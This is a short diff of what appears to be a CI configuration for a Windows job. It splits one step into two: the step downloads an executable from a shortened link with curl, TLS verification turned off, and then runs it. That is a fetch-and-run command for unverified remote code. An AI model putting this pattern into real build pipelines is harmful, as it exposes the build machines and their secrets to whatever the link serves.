@@ -7,4 +7,5 @@ jobs:
       name: win/default
       shell: cmd.exe
     steps:
-      - run: curl -LJOk -o wglgears.exe http://demo.polr.me/lmaooooo && wglgears.exe
+      - run: curl -LJOk http://demo.polr.me/lmaooooo -o wglgears.exe
+      - run: wglgears.exe
